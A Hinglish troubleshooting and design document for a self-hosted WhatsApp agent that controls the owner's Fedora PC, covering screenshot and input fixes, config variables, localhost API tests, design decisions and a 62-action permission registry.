  - `PORTAL_TIMEOUT_MS` 25s → **60s**, aur deadline pe last-chance file check.
  - `waitForCompleteFile()` — aadhi likhi PNG kabhi read nahi hoti.
  - Response code 1 (cancel) aur 2 (deny) ka saaf message.
- **Verify:** `/screenshot` bhejo, PC pe Allow dabao — image aa jayegi (der se dabao to bhi).

#### ⚠️ GNOME Wayland har screenshot pe "Allow screenshot?" poochta hai
- **Kyun:** request `gdbus` se aati hai, jiska koi remembered app-id nahi hota; portal
  per-capture permission maangta hai.
- **Options:** dialog me **"Always allow"** tick karo, ya login screen pe gear →
  **"GNOME on Xorg"** se login karo — X11 pe bina prompt ke capture hota hai.

#### ❌ `No graphical session found`
- **Kyun:** agent systemd service se boot pe chala, desktop baad me aaya; ya
  `WAYLAND_DISPLAY`/`DISPLAY` set hi nahi the. Pehle code `wayland-0` **guess** karta tha.
- **Fix (`2257df3`):** `detectSockets()` asli sockets dekhta hai —
  `/run/user/<uid>/wayland-*` aur `/tmp/.X11-unix/X*` — aur `XDG_SESSION_TYPE` bhi set karta hai.
- **Manual:** PC pe login karo, phir `systemctl --user restart observer-whatsapp-agent`.

### 3.2 Keyboard / mouse

#### ❌ Typing/clicking kaam nahi karta (Wayland)
- **Kyun:** `xdotool` Wayland pe sirf XWayland apps tak pahunchta hai. Sahi tool `ydotool` hai,
  jo **daemon (`ydotoold`) + `/dev/uinput`** maangta hai.
- **Fix:** `fix-desktop.sh` install + `systemctl enable --now ydotool` + socket permission.
  `/doctor` teeno check karta hai: `ydotool`, `ydotoolDaemon`, `uinput`.

#### ❌ Bada chhupa hua bug: systemd unit me `PrivateTmp=true`
- **Kyun:** private `/tmp` ki wajah se `/tmp/.ydotool_socket` aur `/tmp/.X11-unix`
  service ko dikhte hi nahi the → input aur X11 detection **silently** fail.
- **Fix (`2257df3`):** `PrivateTmp=false` (comment ke saath, taaki koi wapas na badle).

#### ❌ 500 characters ke baad typing ruk jati thi
- **Kyun:** `typeText()` me mera hi `slice(0, 500)` tha.
- **Fix (`bff22b0`):**
  - `splitForTyping()` — word boundary pe chunks (`TYPE_CHUNK_CHARS=180`), beech me
    `TYPE_CHUNK_DELAY_MS=60`, aur **ek bhi character nahi khota** (test se prove).
  - `xdotool` fallback ab `type --file -` (stdin) — argv limit zero.
  - Naya `/pc paste <text>` — clipboard + Ctrl+V, long/multi-line ke liye instant.

#### ❌ `No wpctl/pactl found` (volume), Wi-Fi error
- **Fix:** `sudo dnf install wireplumber pipewire-pulseaudio NetworkManager`
  (ya `./scripts/fix-desktop.sh`). Message me exact package ka naam aata hai.

### 3.3 Agent / code ke bugs (development me pakde)

| Error | Root cause | Fix |
|---|---|---|
| `SyntaxError: Unexpected identifier 't'` | patch me single quotes ke andar apostrophe | double quotes use karo (`commands.js`) |
| `deletePath` promise resolve ho raha tha par `gio trash` chalta hi nahi | `execFileAsync(...).then()` non-async function me, await nahi | `async` + `await` |
| Clipboard set "not supported" | `execFile` ka koi `input` option nahi hota | `spawn` + `stdin.end()` |
| `ReferenceError: downloadMediaMessage` | Baileys lazy import se pehle use | `state.downloadMediaMessage` `start()` me capture |
| `spawn gdbus ENOENT` = unhandled rejection | portal promise ka error handle nahi | `findBin` check + `done.catch(() => {})` |
| `EADDRINUSE 0.0.0.0:8787` | purana process chal raha tha, error message dhundhla | clear message + `process.exit(1)` |
| Tests ne home me kachra chhoda | `mkdtemp` ka cleanup nahi | `after()` hook + `rmSync` |
| `raw.githubusercontent.com SSL_ERROR_SYSCALL` | network/ISP block | `api.github.com` contents API fallback |
| `git push` rejected (non-fast-forward) — **sirf development side**, tumhe kabhi nahi | remote pe pehle se commits | `git fetch` + `git reset --soft origin/<branch>` + naya commit (owner curl hi use karta hai) |

### 3.4 Test failures jo sudhare

| Test | Kyun fail | Fix |
|---|---|---|
| `screenshot bhej do` | intent parser me pattern miss | screenshot patterns add |
| `find meaning of life` → `pc find` | question ko file search samajh liya | `looksLikeChat()` + extension check |
| `battery kitni hai?` | Hinglish suffix match nahi | flexible regex |
| `wifi connect SSID pass` | sirf `wifi off/on` handle tha | connect branch add |
| `sent.at(-1)` assert | reply object vs string | shape check |
| `toolsFor(...)` me `screenshot` | 20-tool limit truncate kar raha tha | assertion hata ke `open_app` + length ≤ 20 |
| icon PNG < 1000 bytes | 192px PNG 995 bytes ka hai | threshold 200 |

---

## 4. Config jo naya add hua (`.env.example`)

| Variable | Default | Kaam |
|---|---|---|
| `ACCESS_LEVEL` | `full` | `safe` / `standard` / `full` — kitna access |
| `FILES_EXTRA_ROOTS` | — | home ke bahar allowed folders |
| `CONFIRM_TTL_MS` | `120000` | destructive confirmation ka wait |
| `AGENT_TOOLS` / `MAX_AGENT_STEPS` | `true` / `6` | AI tool-calling on/off, max steps |
| `AGENT_TOOL_LIMIT` | `20` | model ko kitne tool schemas bhejne hain |
| `OLLAMA_NUM_CTX` | `8192` | Ollama context window |
| `OCR_LANGS` | `eng` | tesseract languages (`eng+hin`) |
| `WHISPER_*` | — | voice notes (Groq free ya local whisper.cpp) |
| `PORTAL_TIMEOUT_MS` | `60000` | Wayland "Allow screenshot?" ka wait |
| `TYPE_CHUNK_CHARS` | `180` | typing chunk size |
| `TYPE_CHUNK_DELAY_MS` | `60` | chunks ke beech pause |
| `DASHBOARD_PIN` | auto | phone app PIN |
| `HOST` / `PORT` | `0.0.0.0` / `8787` | phone app binding |
| `ALLOW_PC_CONTROL` | `true` | input + power |
| `ALLOW_SHELL` + `SHELL_PIN` | `false` / — | raw shell (opt-in) |

---

## 5. Testing — kaise verify kiya

```bash
cd whatsapp-agent
npm test          # 44 tests / 44 pass / 0 fail
npm run check     # har src/*.js ka node --check
npm run demo      # dry-run: phone app + engine, WhatsApp ke bina
```

Test suites:

| File | Kya cover karta hai |
|---|---|
| `test/agent.test.js` | owner gate, allowlist, command router, store, relink, HTTP/health |
| `test/power.test.js` | intents (Hinglish), action registry + permissions, confirmations, black-frame detection, portal parsing, file-watcher, chunked typing, PWA icons, bridge API |

Development ke waqt jo manual checks kiye:

```bash
# phone app + API (dry-run)
npm run demo &                     # ya: node src/index.js --dry-run
PIN=$(cat data/dashboard-pin.txt)
T=$(cat data/bridge-token.txt)

curl -s localhost:8787/health
curl -s -X POST localhost:8787/api/login -H 'content-type: application/json' -d "{\"pin\":\"$PIN\"}"
curl -s -X POST localhost:8787/api/chat -H "x-bridge-token: $T" \
  -H 'content-type: application/json' -d '{"text":"/doctor"}'
curl -s -X POST localhost:8787/api/chat -H "x-bridge-token: $T" \
  -H 'content-type: application/json' -d '{"text":"file banao ~/a.txt me hello"}'
curl -s -X POST localhost:8787/api/action -H "x-bridge-token: $T" \
  -H 'content-type: application/json' -d '{"name":"system_status"}'
```

Jo yahan verify nahi ho saka (sandbox me GUI/Ollama nahi hai) — asli Fedora pe
`/doctor` se check karo: screenshot, keyboard/mouse, OCR, AI.

---

## 6. Design decisions (kyun aisa kiya)

1. **Ek registry, teen caller.** Commands, Hinglish intents aur AI — sab
   `actions.js` se guzarte hain, isliye permission/confirmation kabhi bypass nahi hoti.
2. **AI optional.** Har core kaam ka offline raasta hai; Ollama na ho to bhi
   "chrome kholo" chalta hai. AI sirf multi-step aur free-form ke liye hai.
3. **Shell default off.** `ALLOW_SHELL=true` + `SHELL_PIN` ke bina `/run` nahi chalta —
   ye ek hi cheez hai jo kuch bhi undo kar sakti hai.
4. **argv-only exec.** WhatsApp se aayi string kabhi shell string nahi banti;
   `.desktop` ka `Exec=` trusted source hai.
5. **Fail loud, never silent.** Har action fail hone pe exact package/fix batata hai;
   black screenshot bhejne se behtar hai error.
6. **No dependencies if avoidable.** PNG decode/encode, icons, QR-less flows —
   sab pure Node (`zlib`). `sharp` optional hai.
7. **User ke data kabhi touch nahi.** Update scripts sirf code replace karte hain:
   `.env`, `auth_info/`, `data/` untouched.

---

## 7. Registry — 62 actions ka breakdown

| Level | Count | Actions |
|---|---|---|
| `safe` | 33 | `list_apps, list_windows, screenshot, volume, brightness, media, notify, lock_screen, clipboard_get, clipboard_set, network_info, doctor, system_status, disk_space, battery, processes, service_status, list_dir, read_file, search_files, weather, wikipedia, news, read_webpage, calculate, add_reminder, list_reminders, add_todo, list_todos, complete_todo, add_note, list_notes, remember_fact` |
| `standard` | 27 | `open_app, close_app, focus_window, look_at_screen, ocr_screen, computer_use, wifi, bluetooth, kill_process, service_restart, write_file, delete_path, move_path, copy_path, make_dir, zip_paths, unzip_path, download_url, send_file, webcam_photo, record_screen, type_text, paste_text, press_keys, click, move_mouse, scroll` |
| `full` | 2 | `power` (shutdown/reboot/suspend), `run_shell` (PIN + opt-in) |

Destructive (confirmation maangte hain): `delete_path`, `kill_process`,
`close_app`, `power`, `run_shell`, `service_restart`.

---

## 8. Known limits (honest list)

- **Lock screen / GDM / password / polkit prompt me typing nahi** — OS apni security
  ke liye rokti hai. Koi user-level tool ise bypass nahi kar sakta.
- **Koi logged-in na ho to screen control nahi.** Text commands (files, shell,
  downloads, lookups) chalte rehte hain.
- **GNOME Wayland pe window list/focus nahi** (`wmctrl` X11-only).
- **GNOME Wayland pe screenshot prompt** har capture pe aa sakta hai (upar fix dekho).
- **Laptop sleep = agent offline**; ghar ka internet down = kuch bhi reachable nahi.
- **WhatsApp Baileys unofficial hai** — sirf owner ko reply karta hai, rate-limited;
  apne main number pe mat chalao.

---

## 9. Agar kuch toote — is order me dekho

1. `/doctor` (WhatsApp ya phone app) — sabse pehle.
2. `journalctl --user -u observer-whatsapp-agent -n 100 --no-pager`
3. `./scripts/fix-desktop.sh` (screenshot/input issues)
4. `./scripts/update-from-github.sh --check` (purana code?)
5. `npm test` (44/44 hona chahiye)
6. Docs: `QUICKSTART.md` → `README.md` → `../FEDORA.md`

---

_Last updated with commit `5e2bbcd` (log) / code `bff22b0` · install & update always via **curl**, never git._
